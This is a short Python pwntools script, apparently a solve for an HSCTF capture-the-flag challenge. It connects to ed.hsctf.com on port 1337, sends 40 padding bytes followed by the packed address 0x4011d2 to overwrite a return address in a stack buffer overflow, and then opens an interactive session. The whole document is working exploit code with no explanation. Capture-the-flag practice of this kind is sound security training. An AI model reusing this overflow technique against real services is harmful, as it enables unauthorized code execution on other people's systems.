from pwn import *

io = remote('ed.hsctf.com', 1337)
io.sendline(b'i'*40 + p64(0x4011d2))
io.interactive()